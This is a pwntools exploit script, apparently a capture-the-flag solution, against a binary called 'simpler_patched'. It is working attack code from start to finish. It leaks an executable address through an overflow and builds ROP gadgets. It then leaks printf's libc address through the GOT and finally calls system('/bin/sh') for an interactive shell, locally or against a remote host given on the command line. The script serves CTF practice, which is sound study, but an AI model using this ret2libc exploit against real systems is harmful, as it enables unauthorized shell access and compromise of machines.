from pwn import *
from warnings import filterwarnings

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
breakrva 0x000000000000133b
continue
'''.format(**locals())

# Binary filename
exe = './simpler_patched'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'
filterwarnings("ignore")

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()
libc = elf.libc

# ===========================================================
#                   Leak ELF Section
# ===========================================================

io.recvuntil('here:')
io.sendline('sh'+'a'*29)
io.recvuntil('a\n')
leak = unpack(io.recv()[:6].ljust(8, b"\x00"))
elf.address = leak - (0x557c0d4a2221- 0x557c0d4a1000)
log.info("Leaked Address: %#x", leak)
log.info("ELF Base Address: %#x", elf.address)

# ===========================================================
#                    ELF Gadgets
# ===========================================================

pop_rdi = elf.address + 0x00000000000011ee #  pop rdi; ret; 
xor_rsi = elf.address + 0x00000000000011f0 # xor rsi, rsi; ret; 
xor_rdx = elf.address + 0x00000000000011f4 # xor rdx, rdx; ret; 
pop_rax = elf.address + 0x00000000000011ec # pop rax; ret; 
ret = elf.address + 0x000000000000101a # ret; 
syscall = elf.address + 0x00000000000011e9 # syscall; ret; 

# ===========================================================
#                    Ret2Libc
# ===========================================================

offset = 56

payload = flat({
    offset:[
        elf.sym['notcalled'],
        pop_rdi,
        elf.got['printf'],
        elf.plt['printf'],
        elf.address + 0x1231
    ]
})

io.sendline(payload)
# io.recv()
printf = unpack(io.recv()[:6].ljust(8, b"\x00"))
libc.address = printf - libc.sym['printf']
info("Leaked Printf Address: %#x", printf)
info("Libc Base Address: %#x", libc.address)

sh = next(libc.search(b'/bin/sh\x00'))
system = libc.symbols['system']
info('/bin/sh: %#x', sh)
info('system: %#x', system)

payload = flat({
    offset: [
        elf.sym['notcalled'],
        pop_rdi,
        sh,
        system
    ]
})

io.sendline('a')
io.sendline(payload)
io.interactive()
